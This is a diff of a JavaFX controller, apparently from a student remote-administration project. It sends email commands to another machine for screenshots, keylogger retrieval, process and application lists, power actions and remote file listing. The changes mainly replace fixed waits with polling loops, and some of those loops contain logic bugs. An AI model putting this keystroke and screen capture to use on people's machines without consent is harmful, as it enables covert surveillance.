@@ -1,7 +1,6 @@
 package com.example.project;
 
 import com.example.project.mail.receiveMail;
-import javafx.animation.PauseTransition;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
@@ -12,34 +11,28 @@ import javafx.scene.Scene;
 import javafx.scene.control.*;
 import javafx.scene.control.Button;
 import javafx.scene.control.Label;
-import javafx.scene.control.TextField;
 import javafx.scene.control.cell.PropertyValueFactory;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
-import javafx.scene.input.KeyEvent;
 import javafx.scene.input.MouseEvent;
 import com.example.project.mail.sendMail;
-import javafx.scene.layout.AnchorPane;
 import javafx.scene.paint.Color;
 import javafx.stage.Stage;
-import javafx.util.Duration;
-
-import javax.swing.*;
 import java.awt.*;
 import javafx.scene.control.TextArea;
-
 import java.io.*;
-import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
-import java.util.ResourceBundle;
-import java.util.Scanner;
 
 public class ClientController {
     public String textControl;
-    @FXML private Button buttonsd, buttonsl, buttonres,buttonlog,buttonscrshot,buttonzoom,buttonsaveasScr, buttonLogTurnOn,buttonLogTurnOff,buttonsaveasLog,buttonStartPrc,buttonStartApp;
-    @FXML private Label responsePower,responeScr;
+    @FXML private Button buttonsd, buttonsl, buttonres,buttonlog,
+            buttonscrshot,buttonzoom,buttonsaveasScr,
+            buttonLogTurnOn,buttonLogTurnOff,buttonsaveasLog,
+            buttonStartPrc,buttonStartApp,
+            buttonBackAddress, buttonGetAddress;
+    @FXML private Label responsePower,responeScr, label_warning;
     @FXML private ImageView scrshot;
     @FXML private TextArea LogText;
     private int[] number = {0,0,0,0,0,0,0,0,0,0};
@@ -50,7 +43,7 @@ public class ClientController {
             System.exit(0);
         }
     }
-    private String key = "KGOXNVIC";
+    private String key = "IVDLLCOT";
     private String to = "projectmangmaytinh2004@gmail.com";
 
     // Sender's email ID needs to be mentioned
@@ -82,43 +75,56 @@ public class ClientController {
         }
     }
 
-    public void OnButtonScrshot(ActionEvent event) throws IOException{
+    public void OnButtonScrshot(ActionEvent event) throws IOException {
         System.out.println("scrshot");
-        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to  screenshoot?", ButtonType.YES, ButtonType.NO);
+        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to screenshot?", ButtonType.YES, ButtonType.NO);
         alert.showAndWait();
+
         if (alert.getResult() == ButtonType.YES) {
-            number[4]+=1;
+            number[4] += 1;
             Platform.runLater(() -> {
                 buttonscrshot.setDisable(true);
                 responeScr.setText("Please wait a few minutes!");
             });
+
             Thread newThread = new Thread(() -> {
-                send.setSubject(key+ " "+ number[4]);
+                send.setSubject(key + " " + number[4]);
                 send.sendContent("4");
-                try {
-                    Thread.sleep(15000);
-                } catch (InterruptedException e) {
-                    throw new RuntimeException(e);
-                }
                 File oldfile = new File("src/main/resources/com/example/project/file/screen.png");
                 oldfile.delete();
-                receiveMail receive = new receiveMail(username,password);
-                receive.receiveMail();
-                System.out.println(receive.getContent());
-                if (receive.getContent().equals(key+" "+ number[4])){
-                    //Xóa file cũ nếu có
-                    File file = new File("src/main/resources/com/example/project/file/screen.png");
-                    Image image = new Image(file.toURI().toString());
-                    Platform.runLater(() -> {
-                        scrshot.setImage(image);
-                        buttonscrshot.setDisable(false);
-                        buttonzoom.setDisable(false);
-                        buttonsaveasScr.setDisable(false);
-                        responeScr.setText("Successful!");
-                    });
+
+                long startTime = System.currentTimeMillis();
+                long timeout = 60000; // 60 seconds in milliseconds
+
+                boolean correctResponseReceived = false;
+                while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived) {
+                    receiveMail receive = new receiveMail(username, password);
+                    receive.receiveMail();
+                    System.out.println(receive.getContent());
+
+                    if (receive.getContent().equals(key + " " + number[4])) {
+                        correctResponseReceived = true;
+                        File file = new File("src/main/resources/com/example/project/file/screen.png");
+                        Image image = new Image(file.toURI().toString());
+                        Platform.runLater(() -> {
+                            scrshot.setImage(image);
+                            buttonscrshot.setDisable(false);
+                            buttonzoom.setDisable(false);
+                            buttonsaveasScr.setDisable(false);
+                            responeScr.setText("Successful!");
+                        });
+                        break;
+                    }
+
+                    try {
+                        Thread.sleep(5000); // Wait for 1 second before checking again
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
                 }
-                else  {
-                    Platform.runLater(()->{
+
+                if (!correctResponseReceived) {
+                    Platform.runLater(() -> {
                         buttonscrshot.setDisable(false);
                         responeScr.setText("Failed, please send again!");
                         responeScr.setTextFill(Color.RED);
@@ -130,6 +136,7 @@ public class ClientController {
             buttonscrshot.setDisable(false);
         }
     }
+
     public void OnButtonZoom(ActionEvent event) throws IOException{
         if (!buttonzoom.isDisable()){
             Platform.runLater(()->{
@@ -203,44 +210,48 @@ public class ClientController {
         }
     }
     public void OnButtonLogTurnOff(ActionEvent event) throws IOException{
-        number[2]+=1;
+        number[1]+=1;
         if (!buttonLogTurnOff.isDisable()){
             Platform.runLater(() -> {
                 buttonLogTurnOff.setDisable(true);
             });
             Thread newThread = new Thread(() -> {
-                send.setSubject(key+ " "+ number[2]);
+                send.setSubject(key+ " "+ number[1]);
                 send.sendContent("2");
-                try {
-                    Thread.sleep(15000);
-                } catch (InterruptedException e) {
-                    throw new RuntimeException(e);
-                }
-                receiveMail receive = new receiveMail(username,password);
-                receive.receiveFile();
-                if (receive.getContent().equals(key+" "+ number[2])){
-                    File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
-                    oldfile.delete();
-                    File file = new File("src/main/resources/com/example/project/file/keylog.txt");
-                    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
-                        StringBuilder content = new StringBuilder();
-                        String text;
-                        while ((text = br.readLine()) != null) {
-                            content.append(text).append("\n");
+                long startTime = System.currentTimeMillis();
+                long timeout = 60000; // 60 seconds in milliseconds
+                boolean correctResponseReceived = false;
+                File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
+                oldfile.delete();
+                while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived){
+                    receiveMail receive = new receiveMail(username,password);
+                    receive.receiveMail();
+                    if (receive.getContent().equals(key+" "+ number[1])){
+                        File file = new File("src/main/resources/com/example/project/file/keylog.txt");
+                        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
+                            StringBuilder content = new StringBuilder();
+                            String text;
+                            while ((text = br.readLine()) != null) {
+                                content.append(text).append("\n");
+                            }
+                            Platform.runLater(() -> {
+                                LogText.setText(String.valueOf(content));
+                                buttonLogTurnOff.setDisable(false);
+                                buttonsaveasLog.setDisable(false);
+                                buttonLogTurnOn.setDisable(false);
+                            });
+                            break;
+                        } catch (IOException e) {
+                            e.printStackTrace();
                         }
-                        String finalText = text;
-                        Platform.runLater(() -> {
-                            LogText.setText(finalText);
-                            buttonLogTurnOff.setDisable(false);
-                            buttonsaveasLog.setDisable(false);
-                            buttonLogTurnOn.setDisable(false);
-                        });
-                    } catch (IOException e) {
+                    }
+                    try {
+                        Thread.sleep(5000); // Wait for 1 second before checking again
+                    } catch (InterruptedException e) {
                         e.printStackTrace();
                     }
                 }
             });
-
             newThread.start();
         }
     }
@@ -292,25 +303,32 @@ public class ClientController {
             Thread newThread = new Thread(() -> {
                 send.setSubject(key +" "+ number[index]);
                 send.sendContent(pow);
-                try {
-                    Thread.sleep(15000);
-                } catch (InterruptedException e) {
-                    throw new RuntimeException(e);
-                }
-                receiveMail receive = new receiveMail(username,password);
-                receive.receiveMail();
-                if (receive.getContent().equals(key+" "+number[index])){
-                    if (receive.getText().equals("successfull")){
-                        Platform.runLater(() -> {
-                            buttonsd.setDisable(false);
-                            buttonsl.setDisable(false);
-                            buttonres.setDisable(false);
-                            buttonlog.setDisable(false);
-                            responsePower.setText("Successfull!");
-                        });
+                long startTime = System.currentTimeMillis();
+                long timeout = 60000; // 60 seconds in milliseconds
+
+                boolean correctResponseReceived = false;
+                while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived) {
+                    receiveMail receive = new receiveMail(username,password);
+                    receive.receiveMail();
+                    if (receive.getContent().equals(key+" "+number[index])){
+                        if (receive.getText().equals("successfull")){
+                            Platform.runLater(() -> {
+                                buttonsd.setDisable(false);
+                                buttonsl.setDisable(false);
+                                buttonres.setDisable(false);
+                                buttonlog.setDisable(false);
+                                responsePower.setText("Successfull!");
+                            });
+                        }
+                        break;
+                    }
+                    try {
+                        Thread.sleep(5000); // Wait for 1 second before checking again
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
                     }
                 }
-                else {
+                if (!correctResponseReceived) {
                     Platform.runLater(() -> {
                         buttonsd.setDisable(false);
                         buttonsl.setDisable(false);
@@ -319,10 +337,10 @@ public class ClientController {
                         responsePower.setText("Failed, please sendmail again!");
                     });
                 }
-
             });
             newThread.start();
-        } else {
+        }
+        else {
             buttonsd.setDisable(false);
             buttonsl.setDisable(false);
             buttonres.setDisable(false);
@@ -353,36 +371,43 @@ public class ClientController {
         Thread thread = new Thread(()->{
             send.setSubject(key +" "+ number[3]);
             send.sendContent("3");
-            try {
-                Thread.sleep(15000);
-            } catch (InterruptedException e) {
-                throw new RuntimeException(e);
-            }
+
             File oldfile = new File("src/main/resources/com/example/project/file/listPrc.txt");
             oldfile.delete();
-            receiveMail receive = new receiveMail(username,password);
-            receive.receiveMail();
-            System.out.println(receive.getContent());
-            if (receive.getContent().equals(key+" "+number[3])){
-                Platform.runLater(()->{
-                    System.out.println("ok");
-                    ProcessList = FXCollections.observableArrayList();
-                    prc_ProcessName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_ProcessName"));
-                    prc_PID.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_PID"));
-                    prc_SessionName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_SessionName"));
-                    prc_Session.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_Session"));
-                    prc_MemUsage.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_MemUsage"));
-                    loadDataFromFile();
-                    prc_Table.setItems(ProcessList);
-                    buttonStartPrc.setDisable(false);
-                });
+            long startTime = System.currentTimeMillis();
+            long timeout = 60000; // 60 seconds in milliseconds
+
+            boolean correctResponseReceived = false;
+            while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived) {
+                receiveMail receive = new receiveMail(username, password);
+                receive.receiveMail();
+                System.out.println(receive.getContent());
+                if (receive.getContent().equals(key + " " + number[3])) {
+                    Platform.runLater(() -> {
+                        System.out.println("ok");
+                        ProcessList = FXCollections.observableArrayList();
+                        prc_ProcessName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_ProcessName"));
+                        prc_PID.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_PID"));
+                        prc_SessionName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_SessionName"));
+                        prc_Session.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_Session"));
+                        prc_MemUsage.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_MemUsage"));
+                        loadDataFromFile();
+                        prc_Table.setItems(ProcessList);
+                        buttonStartPrc.setDisable(false);
+                    });
+                    break;
+                }
+                try {
+                    Thread.sleep(5000); // Wait for 1 second before checking again
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
             }
-            else{
+            if (!correctResponseReceived){
                 buttonStartPrc.setDisable(false);
             }
         });
         thread.start();
-
     }
     public void loadDataFromFile() {
         File file = new File("src/main/resources/com/example/project/file/listPrc.txt");
@@ -414,25 +439,35 @@ public class ClientController {
         Thread thread = new Thread(()->{
             send.setSubject(key +" "+ number[0]);
             send.sendContent("0");
-            try {
-                Thread.sleep(15000);
-            } catch (InterruptedException e) {
-                throw new RuntimeException(e);
-            }
+            long startTime = System.currentTimeMillis();
+            long timeout = 60000; // 60 seconds in milliseconds
+
+            boolean correctResponseReceived = false;
             File oldfile = new File("src/main/resources/com/example/project/file/listApp.txt");
             oldfile.delete();
-            receiveMail receive = new receiveMail(username,password);
-            receive.receiveMail();
-            System.out.println(receive.getContent());
-            if (receive.getContent().equals(key+" "+number[0])) {
-                Platform.runLater(() -> {
-                    System.out.println("ok");
-                    Applist = FXCollections.observableArrayList();
-                    app_Name.setCellValueFactory(new PropertyValueFactory<TaskInfo.Application, String>("app_Name"));
-                    loadAppFromFile();
-                    app_Table.setItems(Applist);
-                    buttonStartApp.setDisable(false);
-                });
+            while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived) {
+                receiveMail receive = new receiveMail(username, password);
+                receive.receiveMail();
+                System.out.println(receive.getContent());
+                if (receive.getContent().equals(key + " " + number[0])) {
+                    Platform.runLater(() -> {
+                        System.out.println("ok");
+                        Applist = FXCollections.observableArrayList();
+                        app_Name.setCellValueFactory(new PropertyValueFactory<TaskInfo.Application, String>("app_Name"));
+                        loadAppFromFile();
+                        app_Table.setItems(Applist);
+                        buttonStartApp.setDisable(false);
+                    });
+                    break;
+                }
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+            if (!correctResponseReceived){
+                buttonStartApp.setDisable(false);
             }
         });
         thread.start();
@@ -453,6 +488,93 @@ public class ClientController {
         }
     }
 
+    //Get file
+    @FXML
+    private TableView <TaskInfo.address> table_address;
+    @FXML
+    private TableColumn<TaskInfo.address,String> name_address;
+    private ObservableList<TaskInfo.address> Addresslist;
+    private String path=" ";
+    private Boolean isGetAddress = false;
+    public void OnButtonBackAddress(ActionEvent event){
 
+    }
+    public void OnButtonGetAddress(ActionEvent event){
+        number[9]+=1;
+        Platform.runLater(()->{
+            buttonGetAddress.setDisable(true);
+        });
+        send.setSubject(key +" "+ number[9]);
+        if (number[9]==1){
+            send.sendContent("9");
+        }
+        TaskInfo.address selectedItem = table_address.getSelectionModel().getSelectedItem();
+        if ((selectedItem != null)&&(number[9]!=1)) {
+            path = " "+selectedItem.getName_address();
+            send.sendContent("9"+ path);
+            System.out.println("Selected text: " + selectedItem.getName_address());
+        }
+        else {
+           if (number[9]!=1){
+               label_warning.setText("Please, choose address!");
+               Platform.runLater(()->{
+                   buttonGetAddress.setDisable(false);
+               });
+               return;
+           }
+        }
+        long startTime = System.currentTimeMillis();
+        long timeout = 60000; // 60 seconds in milliseconds
+
+        boolean correctResponseReceived = false;
+        File oldfile = new File("src/main/resources/com/example/project/file/filelists.txt");
+        oldfile.delete();
+        while (System.currentTimeMillis() - startTime < timeout && !correctResponseReceived) {
+            receiveMail receive = new receiveMail(username, password);
+            receive.receiveMail();
+            System.out.println(receive.getContent());
+            if (receive.getContent().equals(key + " " + number[9]+ " ok")){
+                number[9]=0;
+                path="";
+                Platform.runLater(()->{
+                    buttonGetAddress.setDisable(false);
+                });
+                System.out.println("Nhan file roi");
+                // Luu file luon
+            }
+            if (receive.getContent().equals(key + " " + number[9])){
+                Platform.runLater(() -> {
+                    System.out.println("ok");
+                    Addresslist = FXCollections.observableArrayList();
+                    name_address.setCellValueFactory(new PropertyValueFactory<TaskInfo.address, String>("name_address"));
+                    loadAddressFromFile();
+                    table_address.setItems(Addresslist);
+                    buttonGetAddress.setDisable(false);
+                });
+                break;
+            }
+            try {
+                Thread.sleep(5000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+        if (!correctResponseReceived){
+            buttonGetAddress.setDisable(false);
+        }
+    }
+    public void loadAddressFromFile() {
+        File file = new File("src/main/resources/com/example/project/file/filelists.txt");
+        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                TaskInfo.address taskinfo = new TaskInfo.address(line);
+                Addresslist.add(taskinfo);
+            }
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 }
 
